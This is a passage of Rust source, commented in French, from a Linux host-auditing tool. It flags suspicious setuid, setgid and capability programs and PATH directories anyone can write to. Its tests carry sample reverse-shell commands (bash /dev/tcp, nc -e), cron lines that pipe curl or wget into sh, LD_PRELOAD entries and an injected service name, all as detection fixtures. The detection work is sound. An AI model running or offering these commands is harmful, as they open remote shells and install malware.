        .filter(|(f, caps)| f.starts_with('/') && caps.contains("cap_"))
        .map(|(f, _)| std::path::PathBuf::from(f))
        .collect()
}

/// Programmes privilégiés (setuid, setgid, capacités : lancés avec des droits que l'utilisateur n'a pas) là où il ne
/// devrait pas y en avoir, qui n'appartiennent à aucun paquet ou qui ont changé depuis leur installation ; et PATH piégeable.
/// Les fichiers de `d`, jusqu'à `profondeur` sous-dossiers plus bas, qui passent `test`.
fn parcourir(d: &Path, profondeur: u32, trouve: &mut Vec<std::path::PathBuf>, test: &dyn Fn(&Path) -> bool) {
    for e in std::fs::read_dir(d).into_iter().flatten().flatten() {
        let p = e.path();
        if e.file_type().is_ok_and(|t| t.is_dir()) {
            if profondeur > 0 {
                parcourir(&p, profondeur.saturating_sub(1), trouve, test);
            }
        } else if test(&p) {
            trouve.push(p);
        }
    }
}

/// Programmes privilégiés (setuid, setgid, capacités : lancés avec des droits que l'utilisateur n'a pas) là où il ne
/// devrait pas y en avoir, qui n'appartiennent à aucun paquet ou qui ont changé depuis leur installation ; et PATH piégeable.
pub(super) fn fichiers_suspects() -> Vec<Constat> {
    use std::os::unix::fs::MetadataExt;
    use std::os::unix::fs::PermissionsExt;
    let (mut anormaux, systeme, capacites) = programmes_privilegies();
    let gestion = Paquets::detecter();
    let (modifies, non_verifies) =
        gestion.map_or((Vec::new(), 0), |g| comparer_aux_paquets(g, &systeme, &mut anormaux));
    let mode = |p: &Path| std::fs::symlink_metadata(p).ok().map(|m| m.mode());
    let caps = capacites.as_deref().unwrap_or_default();
    let chemins_modifies: Vec<std::path::PathBuf> = modifies.iter().map(|(p, _)| p.clone()).collect();
    let gestes_modifies = gestes_de_privilegies(&chemins_modifies, caps, mode);
    let gestes_anormaux = gestes_de_privilegies(&anormaux, caps, mode);
    let modifies: Vec<(String, String)> = modifies
        .into_iter()
        .map(|(p, paquet)| (crate::ui::chemin_affichable(&p), paquet))
        .collect();
    let reinstaller = {
        let mut paquets: Vec<&str> = modifies.iter().map(|(_, p)| p.as_str()).collect();
        paquets.dedup();
        gestion.map(|g| g.reinstaller(&paquets.join(" "))).unwrap_or_default()
    };
    let path = std::env::var("PATH").unwrap_or_default();
    let path_dangereux = path_dangereux(&path, |d| std::fs::metadata(d).ok().map(|m| m.permissions().mode()));
    juger_fichiers_suspects(&Releve {
        modifies,
        anormaux,
        systeme: systeme.len(),
        gestion: gestion.is_some(),
        non_verifies,
        capacites_lues: capacites.is_some(),
        path_dangereux,
        reinstaller,
        gestes_modifies,
        gestes_anormaux,
    })
}

/// Les gestes qui retirent leurs droits à ces programmes : le setuid/setgid de ceux qui l'ont (`mode`, lu sans
/// suivre de lien), les capacités de ceux que getcap a listés (`capacites`, chemins réels). Tous ou aucun : un chemin
/// qu'un geste ne porte pas, un programme qui n'a plus rien de privilégié (changé depuis le parcours), ou plus de
/// `defense::GESTES_MAX` gestes, et la liste reste à la main. L'enfant root rejuge chacun (paquet, chemin, sudo, su
/// et pkexec) avant de rien faire.
fn gestes_de_privilegies(
    chemins: &[std::path::PathBuf],
    capacites: &[std::path::PathBuf],
    mode: impl Fn(&Path) -> Option<u32>,
) -> Vec<Defense> {
    use std::os::unix::ffi::OsStrExt;
    let mut gestes = Vec::new();
    for p in chemins {
        let Some(c) = gestes_unix::CheminDesigne::nouveau(p.as_os_str().as_bytes()) else {
            return Vec::new();
        };
        let setuid = mode(p).is_some_and(|m| m & 0o6000 != 0);
        let reel = std::fs::canonicalize(p).unwrap_or_else(|_| p.clone());
        let caps = capacites.iter().any(|k| k == p || *k == reel);
        if !setuid && !caps {
            return Vec::new();
        }
        if setuid {
            gestes.push(Defense::RetirerSetuid(c));
        }
        if caps {
            gestes.push(Defense::RetirerCapacites(c));
        }
    }
    if gestes.len() > crate::machine::defense::GESTES_MAX {
        return Vec::new();
    }
    gestes
}

/// Les programmes privilégiés relevés : ceux des dossiers temporaires et personnels qui donnent des droits (setuid à un
/// autre compte, setgid du groupe root), ceux des dossiers du système (chemin réel, sans doublon), et ceux à capacités
/// (tels que getcap les nomme, puis par leur chemin réel ; `None` : getcap n'a pas répondu).
#[allow(
    clippy::type_complexity,
    reason = "trois listes rendues d'un seul parcours, nommées par la doc"
)]
fn programmes_privilegies() -> (
    Vec<std::path::PathBuf>,
    Vec<std::path::PathBuf>,
    Option<Vec<std::path::PathBuf>>,
) {
    use std::os::unix::fs::{MetadataExt, PermissionsExt};
    // Propriétaire du processus, lu sur /proc/self (sans dépendance à la libc).
    let moi = std::fs::metadata("/proc/self").map_or(u32::MAX, |m| m.uid());
    // Dans un dossier temporaire ou personnel, un setuid à soi ne donne aucun droit de plus ; un setuid à un autre
    // compte (root) ou un setgid du groupe root, si.
    let dangereux_hors_systeme = |p: &Path| {
        p.symlink_metadata().is_ok_and(|m| {
            m.is_file()
                && ((m.permissions().mode() & 0o4000 != 0 && m.uid() != moi)
                    || (m.permissions().mode() & 0o2000 != 0 && m.gid() == 0))
        })
    };
    let privilegie = |p: &Path| {
        p.symlink_metadata()
            .is_ok_and(|m| m.is_file() && m.permissions().mode() & 0o6000 != 0)
    };
    // Capacités (setcap) : droits root partiels, invisibles dans « ls -l ». Poser une capacité demande root.
    // Lancé tout de suite, en même temps que les parcours : getcap relit tout /usr/lib (0,6 s).
    // Par son chemin : sous Debian, /usr/sbin n'est pas dans le PATH d'un compte ordinaire, et getcap n'y serait
    // jamais trouvé (les capacités jamais lues).
    let capacites = std::thread::spawn(|| {
        let getcap = crate::commande::outil_systeme("getcap")?;
        sortie(
            &getcap.to_string_lossy(),
            &[
                "-r",
                "/usr/bin",
                "/usr/sbin",
                "/usr/local",
                "/usr/lib",
                "/usr/libexec",
                "/opt",
                "/tmp",
                "/var/tmp",
                "/dev/shm",
            ],
        )
        .map(|s| fichiers_capacites(&s))
    });
    let mut anormaux = Vec::new();
    for (d, prof) in [("/tmp", 3), ("/var/tmp", 3), ("/dev/shm", 3), (home().as_str(), 2)] {
        parcourir(Path::new(d), prof, &mut anormaux, &dangereux_hors_systeme);
    }
    // Dans les dossiers système : chaque setuid ou setgid doit venir d'un paquet, et être intact.
    let mut systeme = Vec::new();
    for (d, prof) in [
        ("/usr/bin", 0),
        ("/usr/sbin", 0),
        ("/usr/local/bin", 0),
        ("/usr/local/sbin", 0),
        ("/usr/lib", 2),
        ("/usr/libexec", 2),
        ("/opt", 3),
    ] {
        parcourir(Path::new(d), prof, &mut systeme, &privilegie);
    }
    let capacites = capacites.join().ok().flatten();
    for p in capacites.iter().flatten() {
        if ["/tmp/", "/var/tmp/", "/dev/shm/"].iter().any(|d| p.starts_with(d)) {
            anormaux.push(p.clone());
        } else if !systeme.contains(p) {
            systeme.push(p.clone());
        }
    }
    // /usr/sbin est un lien vers /usr/bin sur Arch : chemin réel (celui que connaît le paquet), sans doublon.
    let mut systeme: Vec<std::path::PathBuf> = systeme
        .into_iter()
        .map(|p| std::fs::canonicalize(&p).unwrap_or(p))
        .collect();
    systeme.sort();
    systeme.dedup();
    let capacites = capacites.map(|v| {
        let mut tous: Vec<std::path::PathBuf> = v.iter().filter_map(|p| std::fs::canonicalize(p).ok()).collect();
        tous.extend(v);
        tous
    });
    (anormaux, systeme, capacites)
}

/// Chaque programme privilégié du système comparé à son paquet : ceux d'aucun paquet rejoignent `anormaux` ; rend les
/// modifiés (chemin, paquet) et le nombre de ceux qui n'ont pas pu être vérifiés.
fn comparer_aux_paquets(
    gestion: Paquets,
    systeme: &[std::path::PathBuf],
    anormaux: &mut Vec<std::path::PathBuf>,
) -> (Vec<(std::path::PathBuf, String)>, usize) {
    let mut par_paquet: std::collections::BTreeMap<String, Vec<std::path::PathBuf>> = std::collections::BTreeMap::new();
    for (p, proprietaire) in systeme.iter().zip(gestion.proprietaires(systeme)) {
        match proprietaire {
            Some(paquet) => par_paquet.entry(paquet).or_default().push(p.clone()),
            None => anormaux.push(p.clone()),
        }
    }
    let (mut modifies, mut non_verifies) = (Vec::new(), 0usize);
    // Chaque paquet se vérifie à part (pacman, zcat et sha256sum, ou dpkg --verify, en lecture seule) : 16 à la
    // fois plutôt qu'un par un, une vingtaine de paquets attendaient l'un après l'autre.
    let paquets: Vec<(&String, &Vec<std::path::PathBuf>)> = par_paquet.iter().collect();
    let mut etats = Vec::new();
    for groupe in paquets.chunks(16) {
        std::thread::scope(|s| {
            let fils: Vec<_> = groupe
                .iter()
                .map(|(paquet, fichiers)| s.spawn(move || gestion.modifies(paquet, fichiers)))
                .collect();
            etats.extend(fils.into_iter().map(|f| f.join().unwrap_or_default()));
        });
    }
    for ((paquet, fichiers), etats) in paquets.into_iter().zip(etats) {
        // Un fil qui a planté rend une liste vide : ses fichiers comptent comme non vérifiés.
        let etats = etats.into_iter().chain(std::iter::repeat(None));
        for (f, etat) in fichiers.iter().zip(etats) {
            match etat {
                Some(true) => modifies.push((f.clone(), paquet.clone())),
                Some(false) => {}
                None => non_verifies = non_verifies.saturating_add(1),
            }
        }
    }
    (modifies, non_verifies)
}

/// Ce que la lecture des programmes privilégiés a relevé, pour son jugement (séparé pour le corpus de détection).
pub(super) struct Releve {
    /// Programmes privilégiés changés depuis leur installation : (chemin montré, paquet).
    pub modifies: Vec<(String, String)>,
    /// Hors paquet, ou dans un dossier temporaire.
    pub anormaux: Vec<std::path::PathBuf>,
    /// Combien de programmes privilégiés dans les dossiers du système.
    pub systeme: usize,
    /// Le gestionnaire de paquets est reconnu.
    pub gestion: bool,
    pub non_verifies: usize,
    /// getcap a répondu.
    pub capacites_lues: bool,
    /// Les dossiers du PATH où d'autres peuvent écrire.
    pub path_dangereux: Vec<String>,
    /// La commande qui remet les paquets des programmes modifiés.
    pub reinstaller: String,
    /// Les gestes de défense qui retirent leurs droits aux modifiés (`gestes_de_privilegies`) ; vide : à la main.
    pub gestes_modifies: Vec<Defense>,
    /// De même pour les anormaux.
    pub gestes_anormaux: Vec<Defense>,
}

pub(super) fn juger_fichiers_suspects(r: &Releve) -> Vec<Constat> {
    let Releve {
        modifies,
        anormaux,
        systeme: n,
        gestion,
        non_verifies,
        capacites_lues,
        path_dangereux: dangereux,
        reinstaller,
        gestes_modifies,
        gestes_anormaux,
    } = r;
    let (n, non_verifies) = (*n, *non_verifies);
    let mut constats = Vec::new();
    if !modifies.is_empty() {
        let liste: Vec<String> = modifies
            .iter()
            .map(|(f, p)| trf!("{f} (paquet {p})", "{f} (package {p})"))
            .collect();
        let constat = alerte(
            "Fichiers suspects",
            Niveau::Critique,
            trf!(
                "Programme(s) privilégié(s) modifié(s) depuis leur installation : {}. Signe possible d'une porte dérobée.", "Privileged program(s) modified since install: {}. Possible sign of a backdoor.",
                liste.join(", ")
            ),
        )
        .manuel(
            tr!("Ne pas le lancer. Remettre l'original depuis les dépôts, puis lancer l'antivirus et changer vos mots de passe", "Do not run it. Restore the original from the repositories, then run the antivirus and change your passwords"),
            &[reinstaller],
        );
        // Retirer ses droits le rend inoffensif tout de suite ; la réinstallation reste à faire (elle les remet,
        // avec le programme d'origine).
        constats.push(crate::machine::defense::corriger(
            constat,
            trf!(
                "Retirer ses droits (setuid, capacités) pour qu'il ne puisse plus servir, puis le remettre depuis les dépôts ({}), lancer l'antivirus et changer vos mots de passe",
                "Remove its rights (setuid, capabilities) so it can no longer be used, then restore it from the repositories ({}), run the antivirus and change your passwords",
                reinstaller
            ),
            gestes_modifies,
        ));
    }
    if !anormaux.is_empty() {
        // Dans un dossier temporaire, n'importe qui choisit le nom : montré (message et commandes à taper), il est
        // rendu inoffensif.
        let liste: Vec<String> = anormaux
            .iter()
            .take(10)
            .map(|p| crate::ui::chemin_affichable(p))
            .collect();
        let constat = alerte(
            "Fichiers suspects",
            Niveau::Eleve,
            trf!(
                "Programme(s) setuid, setgid ou à capacités hors paquet ou dans un dossier temporaire : {}.", "Setuid, setgid or capability program(s) not from a package or in a temporary folder: {}.",
                liste.join(", ")
            ),
        )
        .manuel(
            tr!("Ces programmes peuvent donner des droits root : vérifier d'où ils viennent avant toute chose (ne pas les lancer)", "These programs can give root rights: check where they come from before anything else (do not run them)"),
            &[&format!("ls -l {}", liste.join(" ")), &format!("getcap {}", liste.join(" "))],
        );
        constats.push(crate::machine::defense::corriger(
            constat,
            tr!(
                "Leur retirer ces droits (setuid, setgid, capacités ; le fichier reste, Défaire les remet), puis chercher d'où ils viennent (ne pas les lancer)",
                "Remove those rights from them (setuid, setgid, capabilities; the file stays, Undo puts them back), then find out where they come from (do not run them)"
            ),
            gestes_anormaux,
        ));
    }
    // Un programme privilégié trouvé ne dit rien des capacités : getcap muet, elles n'ont pas été lues, et c'est dit.
    let trouves = !modifies.is_empty() || !anormaux.is_empty();
    if !capacites_lues && trouves {
        constats.push(crate::machine::impossible(
            "Fichiers suspects",
            tr!(
                "capacités des programmes : getcap absent",
                "program capabilities: getcap missing"
            ),
        ));
    }
    if modifies.is_empty() && anormaux.is_empty() {
        let mut message = match (gestion, non_verifies) {
            (false, _) => trf!(
                "Aucun programme privilégié dans les dossiers temporaires ; les {n} du système n'ont pas pu être \
                 rapprochés d'un paquet (gestionnaire de paquets non reconnu).",
                "No privileged program in temporary folders; the {n} system ones could not be \
                 matched to a package (package manager not recognized)."
            ),
            (true, 0) => trf!(
                "Aucun programme privilégié inhabituel : {n} setuid, setgid ou à capacités, tous d'un paquet et intacts.",
                "No unusual privileged program: {n} setuid, setgid or capability programs, all from a package and intact."
            ),
            (true, k) => trf!(
                "Aucun programme privilégié inhabituel : {n} setuid, setgid ou à capacités, tous d'un paquet ; \
                 {k} illisible(s), donc non comparé(s) à l'original.",
                "No unusual privileged program: {n} setuid, setgid or capability programs, all from a package; \
                 {k} unreadable, so not compared to the original."
            ),
        };
        if !capacites_lues {
            message.push_str(tr!(
                " Capacités non vérifiées (getcap absent).",
                " Capabilities not checked (getcap missing)."
            ));
        }
        constats.push(ok("Fichiers suspects", message));
    }
    if !dangereux.is_empty() {
        constats.push(
            alerte(
                "Fichiers suspects",
                Niveau::Eleve,
                trf!(
                    "PATH piégeable : {} (n'importe qui peut y déposer un faux « ls » ou « sudo »).",
                    "Hijackable PATH: {} (anyone can drop a fake “ls” or “sudo” there).",
                    dangereux.join(", ")
                ),
            )
            .manuel(
                tr!(
                    "Retirer ces dossiers du PATH (~/.bashrc, ~/.profile) ou corriger leurs droits",
                    "Remove these folders from the PATH (~/.bashrc, ~/.profile) or fix their permissions"
                ),
                &[],
            ),
        );
    }
    constats
}

#[allow(
    clippy::arithmetic_side_effects,
    clippy::as_conversions,
    reason = "essais : y déborder fait échouer l'essai"
)]
#[cfg(test)]
mod tests {
    use super::*;

    std::thread_local! {
        /// La dernière racine que `persistance_dans` a lue, sur ce fil d'essai.
        pub(super) static RACINE_LUE: std::cell::RefCell<Option<std::path::PathBuf>> =
            const { std::cell::RefCell::new(None) };
    }

    /// D7a : les lignes suspectes des fichiers du système partent par des gestes de défense (une par ligne, sans
    /// doublon) ; une seule ligne ailleurs (dossier personnel, crontab du compte, variable de la session), ou trop de
    /// lignes, et tout reste à la main.
    #[test]
    fn lancements_retires_par_gestes() {
        use crate::machine::gestes_unix::{Defense, GesteUnix, analyser};
        let lancement = |retraits: Vec<Option<(&str, &str)>>| {
            let n = retraits.len();
            constat_des_lancements(Lancements {
                critiques: Vec::new(),
                suspects: (0..n).map(|i| format!("suspect {i}")).collect(),
                sources: Vec::new(),
                retraits: retraits
                    .into_iter()
                    .map(|r| r.map(|(f, l)| (f.into(), l.into())))
                    .collect(),
                ..Lancements::default()
            })
            .correctif
            .unwrap()
        };
        let k = lancement(vec![
            Some(("/etc/ld.so.preload", "/tmp/.x.so /usr/lib/y.so")),
            Some(("/etc/ld.so.preload", "/tmp/.x.so /usr/lib/y.so")),
            Some(("/etc/cron.d/maj", "* * * * * root curl http://exemple.test/x | sh")),
        ]);
        assert!(k.automatique);
        assert_eq!(k.commandes.len(), 2);
        assert!(
            k.commandes
                .iter()
                .all(|l| matches!(analyser(l), Some(GesteUnix::Defense(Defense::RetirerLigne(..), _))))
        );
        assert!(matches!(k.defaire, crate::machine::Defaire::Gestes(ref g) if g.len() == 2));
        // Un mélange : tout à la main.
        assert!(!lancement(vec![Some(("/etc/ld.so.preload", "/tmp/.x.so")), None]).automatique);
        assert!(
            !lancement(vec![
                Some(("/etc/ld.so.preload", "/tmp/.x.so")),
                Some(("/home/alice/.bashrc", "curl x | sh"))
            ])
            .automatique
        );
        // Un fichier au nom piégé n'est jamais désigné.
        assert!(!lancement(vec![Some(("/etc/cron.d/a b", "curl x | sh"))]).automatique);
        // Trop de lignes : à la main.
        let noms: Vec<String> = (0..=crate::machine::defense::GESTES_MAX)
            .map(|i| format!("/etc/cron.d/t{i}"))
            .collect();
        assert!(!lancement(noms.iter().map(|f| Some((f.as_str(), "curl x | sh"))).collect()).automatique);
    }

    /// D7a : chaque service ajouté à la main se désactive par un geste, jamais une unité de session ni du réseau ; un
    /// nom qu'un geste ne porte pas laisse tout à la main, et le nom montré dans la commande est échappé.
    #[test]
    fn services_ajoutes_par_gestes() {
        use crate::machine::gestes_unix::{Defense, GesteUnix, analyser};
        let noms = |v: &[&str]| v.iter().map(|n| (*n).to_string()).collect::<Vec<_>>();
        let k = juger_services_ajoutes(
            &noms(&["maj.timer", "nftables.service", "sauvegarde.service", "sshd.service"]),
            true,
        )
        .unwrap()
        .correctif
        .unwrap();
        assert!(k.automatique);
        let unites: Vec<String> = k
            .commandes
            .iter()
            .map(|l| match analyser(l) {
                Some(GesteUnix::Defense(Defense::DesactiverService(u), _)) => u.as_str().to_string(),
                _ => panic!("geste attendu : {l}"),
            })
            .collect();
        assert_eq!(unites, ["maj.timer", "sauvegarde.service"]);
        assert!(
            !juger_services_ajoutes(&noms(&["a.service"]), false)
                .unwrap()
                .correctif
                .unwrap()
                .automatique
        );
        let k = juger_services_ajoutes(&noms(&["a.service", "x;reboot.service"]), true)
            .unwrap()
            .correctif
            .unwrap();
        assert!(!k.automatique);
        assert!(
            k.commandes.iter().all(|c| c.starts_with("systemctl cat '")),
            "{:?}",
            k.commandes
        );
        assert!(juger_services_ajoutes(&[], true).is_none());
    }

    /// Essai QEMU D7a (Debian) : getcap muet et un setuid hors paquet trouvé, les capacités non lues sont dites à part
    /// (jamais tues derrière l'alerte) ; getcap lu, rien de plus.
    #[test]
    fn capacites_non_lues_dites_meme_avec_une_alerte() {
        let releve = |capacites_lues| Releve {
            modifies: Vec::new(),
            anormaux: vec![std::path::PathBuf::from("/usr/local/bin/alice-x")],
            systeme: 3,
            gestion: true,
            non_verifies: 0,
            capacites_lues,
            path_dangereux: Vec::new(),
            reinstaller: String::new(),
            gestes_modifies: Vec::new(),
            gestes_anormaux: Vec::new(),
        };
        let muet = juger_fichiers_suspects(&releve(false));
        assert!(muet.iter().any(|c| !c.verifie && c.message.contains("getcap")));
        let lu = juger_fichiers_suspects(&releve(true));
        assert!(lu.iter().all(|c| c.verifie));
        assert_eq!(muet.len(), lu.len() + 1);
    }

    /// D7a : un programme privilégié perd son setuid ou ses capacités par un geste ; tous ou aucun : un chemin qu'un
    /// geste ne porte pas, un programme qui n'a plus rien de privilégié ou une liste trop longue laisse tout à la main.
    #[test]
    fn privilegies_par_gestes() {
        use crate::machine::gestes_unix::Defense;
        use std::path::PathBuf;
        const AUCUN: [Defense; 0] = [];
        let p = |s: &str| PathBuf::from(s);
        let modes = |m: u32| move |_: &Path| Some(m);
        let g = gestes_de_privilegies(
            &[p("/tmp/alice-x"), p("/tmp/alice-y")],
            &[p("/tmp/alice-y")],
            |c: &Path| {
                Some(if c == Path::new("/tmp/alice-x") {
                    0o104_755
                } else {
                    0o100_755
                })
            },
        );
        assert!(
            matches!(g.as_slice(), [Defense::RetirerSetuid(a), Defense::RetirerCapacites(b)]
                if a.octets() == b"/tmp/alice-x" && b.octets() == b"/tmp/alice-y"),
            "{g:?}"
        );
        let g = gestes_de_privilegies(&[p("/tmp/alice-x")], &[p("/tmp/alice-x")], modes(0o102_755));
        assert_eq!(g.len(), 2);
        // Plus rien de privilégié (changé depuis le parcours), ou lu par personne : à la main.
        assert_eq!(
            gestes_de_privilegies(&[p("/tmp/alice-x"), p("/tmp/alice-z")], &[], |c: &Path| {
                (c == Path::new("/tmp/alice-x")).then_some(0o104_755)
            }),
            AUCUN
        );
        // Chemin qu'un geste ne porte pas : relatif, à « .. », vide.
        for forge in ["tmp/x", "/tmp/../usr/bin/sudo", "", "/tmp/x/"] {
            assert!(
                gestes_de_privilegies(&[p("/tmp/alice-x"), p(forge)], &[], modes(0o104_755)).is_empty(),
                "{forge}"
            );
        }
        let neuf: Vec<PathBuf> = (0..=crate::machine::defense::GESTES_MAX)
            .map(|i| p(&format!("/tmp/alice{i}")))
            .collect();
        assert_eq!(gestes_de_privilegies(&neuf, &[], modes(0o104_755)), AUCUN);
        assert_eq!(gestes_de_privilegies(&[], &[], modes(0o104_755)), AUCUN);
    }

    /// La ligne retirée est celle du fichier, fin « \r » comprise : l'empreinte que le fils root recalcule.
    #[test]
    fn ligne_telle_qu_ecrite() {
        assert_eq!(telle_qu_ecrite("a\r\nb\n", "a"), "a\r");
        assert_eq!(telle_qu_ecrite("a\nb", "b"), "b");
    }

    /// Le bilan lit la persistance depuis la vraie racine « / » : une autre (relative, ou absolue comme « /x »), le
    /// corpus, qui donne la sienne à `persistance_dans`, ne la verrait pas ; la racine lue est comparée à « / ».
    #[test]
    fn le_bilan_lit_depuis_la_racine() {
        RACINE_LUE.with(|r| *r.borrow_mut() = None);
        let _ = persistance();
        assert_eq!(
            RACINE_LUE.with(|r| r.borrow().clone()),
            Some(std::path::PathBuf::from("/"))
        );
    }

    /// Une seconde ligne suspecte dans un fichier déjà signalé change la clé (avant, seul le fichier y était) ;
    /// l'ordre de lecture et une ligne lue deux fois, non.
    #[test]
    fn nouvelle_ligne_nouvelle_cle() {
        let r1 = "bash -i >& /dev/tcp/10.0.0.9/4444 0>&1";
        let r2 = "curl -s http://exemple.invalid/x | sh";
        let cle = |lignes: &[&str]| {
            let sources = lignes.iter().map(|l| source_de("~/.bashrc", l)).collect();
            crate::modele::Cle::de("LNX-PRS-002", &objet_des_lancements(sources)).unwrap()
        };
        assert_ne!(cle(&[r1]), cle(&[r1, r2]));
        assert_eq!(cle(&[r1, r2]), cle(&[r2, r1, r2]));
        assert_ne!(cle(&[r1]), cle(&[r2]));
        // Les blancs du bord ne changent pas la ligne ; une autre source, si.
        assert_eq!(source_de("crontab", r1), source_de("crontab", &format!("  {r1}\t")));
        assert_ne!(source_de("crontab", r1), source_de("~/.bashrc", r1));
    }

    #[test]
    fn chemins_avant_fusion_de_usr() {
        assert_eq!(
            chemin_hors_usr(Path::new("/usr/bin/fusermount3")).unwrap(),
            Path::new("/bin/fusermount3")
        );
        assert_eq!(chemin_hors_usr(Path::new("/usr/sbin/x")).unwrap(), Path::new("/sbin/x"));
        assert!(chemin_hors_usr(Path::new("/usr/local/bin/x")).is_none());
        assert!(chemin_hors_usr(Path::new("/opt/x")).is_none());
    }

    #[test]
    fn path_piegeable() {
        let droits = |d: &str| match d {
            "/tmp" => Some(0o41777),         // modifiable par tous mais « sticky » : sûr
            "/srv/partage" => Some(0o40777), // modifiable par tous, sans sticky : piège
            _ => Some(0o40755),
        };
        assert_eq!(
            path_dangereux("/usr/bin:/tmp:/srv/partage:.::/bin", droits),
            vec!["/srv/partage", ".", "(vide = dossier courant)"]
        );
        assert_eq!(
            path_dangereux("/usr/local/bin:/usr/bin", droits),
            [] as [std::string::String; 0]
        );
    }

    #[test]
    fn programmes_privilegies() {
        assert_eq!(
            fichiers_capacites(
                "/usr/bin/newuidmap cap_setuid=ep\n/usr/bin/ping = cap_net_raw+ep\n/tmp/un dossier/x cap_sys_admin=ep\n"
            ),
            ["/usr/bin/newuidmap", "/usr/bin/ping", "/tmp/un dossier/x"].map(std::path::PathBuf::from)
        );
        assert_eq!(
            paquet_dpkg("libc6:amd64, libc6-dbg: /usr/bin/ldd\n").as_deref(),
            Some("libc6:amd64")
        );
        assert_eq!(
            paquet_dpkg("diversion by dash from: /bin/sh\ndash: /bin/sh\n").as_deref(),
            Some("dash")
        );
        let mtree = "#mtree\n./usr/bin/sudoedit time=1.0 type=link link=sudo\n./usr/bin/sudo time=1.0 mode=4755 sha256digest=e9f8\n";
        assert_eq!(
            empreinte_mtree(mtree, Path::new("/usr/bin/sudo")).as_deref(),
            Some("e9f8")
        );
        assert_eq!(empreinte_mtree(mtree, Path::new("/usr/bin/sudoedit")), None);
        // Seul « 5 » (contenu) compte : une date ou des droits changés ne prouvent pas un remplacement.
        let verif = "??5??????   /usr/bin/passwd\n.M.......   /usr/bin/su\nS.5....T.  c /etc/sudoers\n";
        assert!(contenu_modifie(verif, Path::new("/usr/bin/passwd")));
        assert!(!contenu_modifie(verif, Path::new("/usr/bin/su")));
        assert!(!contenu_modifie(verif, Path::new("/usr/bin/mount")));
    }

    #[test]
    fn lancements_suspects() {
        // Formes de porte dérobée reconnues partout.
        assert!(commande_suspecte("bash -c 'bash -i >& /dev/tcp/1.2.3.4/4444 0>&1'", false).is_some());
        assert!(commande_suspecte("nc -e /bin/sh 1.2.3.4 4444", false).is_some());
        // nc caché dans une sous-commande, après un « ; » ou derrière un chemin.
        for ligne in [
            "@reboot (nc -e /bin/sh 192.0.2.7 4444 &)",
            "* * * * * cd /tmp;nc -e /bin/sh 192.0.2.7 4444",
            "* * * * * true&&ncat -c bash 192.0.2.7 4444",
            "@reboot { /usr/bin/nc -e /bin/sh 192.0.2.7 4444; }",
            "sh -c '`netcat -e /bin/sh 192.0.2.7 4444`'",
        ] {
            assert!(commande_suspecte(ligne, false).is_some(), "{ligne}");
        }
        assert!(commande_suspecte("curl -fsSL https://x.example/a | sh", false).is_some());
        assert!(commande_suspecte("wget -qO- http://x | /bin/bash", false).is_some());
        assert!(commande_suspecte("echo aGk= | base64 -d | sh", false).is_some());
        // La ligne de cron des mineurs (TeamTNT, Kinsing), telle qu'ils la posent : le téléchargeur entre parenthèses,
        // curl ou à défaut wget, passé à sh.
        for cron in [
            "*/30 * * * * root (curl -fsSL http://192.0.2.7/a.sh||wget -q -O- http://192.0.2.7/a.sh)|sh",
            "*/30 * * * * (curl -fsSL http://192.0.2.7/a.sh||wget -q -O- http://192.0.2.7/a.sh)|sh",
            "* * * * * (curl -fsSL http://192.0.2.7/a.sh)|bash",
            "@reboot $(curl -fsSL http://192.0.2.7/a.sh)|sh",
            "* * * * * cd /tmp;wget -q -O- http://192.0.2.7/a.sh|sudo -u root sh",
        ] {
            assert_eq!(
                commande_suspecte(cron, false),
                Some(tr!(
                    "télécharge un script et l'exécute aussitôt",
                    "downloads a script and runs it right away"
                )),
                "{cron}"
            );
        }
        // Pas des portes dérobées : curl sans exécution, nc sans shell, grep après curl.
        assert!(commande_suspecte("curl -fsS https://x/a.json | jq .", false).is_none());
        assert!(commande_suspecte("nc -z 10.0.0.1 22", false).is_none());
        assert!(commande_suspecte("(nc -z 10.0.0.1 22 && echo ok)", false).is_none());
        assert!(commande_suspecte("export TMPDIR=/tmp/moi", false).is_none());
        // Programme lancé depuis /tmp ou un dossier caché : seulement pour une commande lancée.
        assert!(commande_suspecte("/tmp/.x/run --daemon", true).is_some());
        assert!(commande_suspecte("-/dev/shm/a", true).is_some());
        assert!(commande_suspecte("~/.cache/.u/agent", true).is_some());
        assert!(commande_suspecte("%h/.mozilla/x", true).is_some());
        assert!(commande_suspecte("~/.local/bin/plein-ecran", true).is_none());
        assert!(commande_suspecte("%h/.cargo/bin/vanguard surveiller", true).is_none());
        assert!(commande_suspecte("/usr/bin/xrandr --output DP-1", true).is_none());
        assert!(commande_suspecte("cd /tmp/x", false).is_none());
    }

    /// Le fichier qui lance un programme, tel qu'il est montré : court sous le dossier personnel, et inoffensif.
    #[test]
    fn fichiers_de_demarrage_montres() {
        let maison = Path::new("/home/alice");
        assert_eq!(
            court(Path::new("/home/alice/.config/autostart/x.desktop"), maison),
            "~/.config/autostart/x.desktop"
        );
        assert_eq!(court(Path::new("/etc/profile.d/a.sh"), maison), "/etc/profile.d/a.sh");
        assert_eq!(
            court(
                Path::new("/home/alice/.config/autostart/x\x1b]0;t\x07\x1b[2K\r\u{202e}.desktop"),
                maison
            ),
            "~/.config/autostart/x�]0;t��[2K��.desktop"
        );
    }

    #[test]
    fn lignes_de_demarrage() {
        assert_eq!(
            commande_lancee("ExecStart=-/usr/bin/foo -x").as_deref(),
            Some("-/usr/bin/foo -x")
        );
        assert_eq!(
            commande_lancee("Exec=steam -silent %U").as_deref(),
            Some("steam -silent %U")
        );
        assert_eq!(commande_lancee("exec-once = waybar").as_deref(), Some("waybar"));
        assert_eq!(
            commande_lancee(r#"o.exec_on_start("~/.local/bin/plein-ecran")"#).as_deref(),
            Some("~/.local/bin/plein-ecran")
        );
        assert_eq!(commande_lancee(r#"-- o.launch_on_start("my-service")"#), None);
        assert_eq!(commande_lancee("# ExecStart=/tmp/x"), None);
        assert_eq!(commande_lancee("Description=Exec=/tmp/x"), None);
        assert_eq!(commande_lancee("Name=Steam"), None);
        assert!(definit_prechargement("export LD_PRELOAD=/home/x/.l/libz.so"));
        assert!(definit_prechargement("env = LD_PRELOAD,/tmp/a.so"));
        assert!(!definit_prechargement("unset LD_PRELOAD"));
        assert!(!definit_prechargement("# LD_PRELOAD=/x"));
    }

    /// Une arborescence jetable (racine, dossier personnel d'alice), et la lecture de sa persistance : le constat des
    /// lancements.
    struct Maison {
        racine: std::path::PathBuf,
    }

    impl Maison {
        fn nouvelle(nom: &str) -> Maison {
            let racine = crate::essais::temporaire().join(format!("vanguard-normal-{nom}-{}", std::process::id()));
            let _ = std::fs::remove_dir_all(&racine);
            std::fs::create_dir_all(racine.join("home/alice/.config/systemd/user")).unwrap();
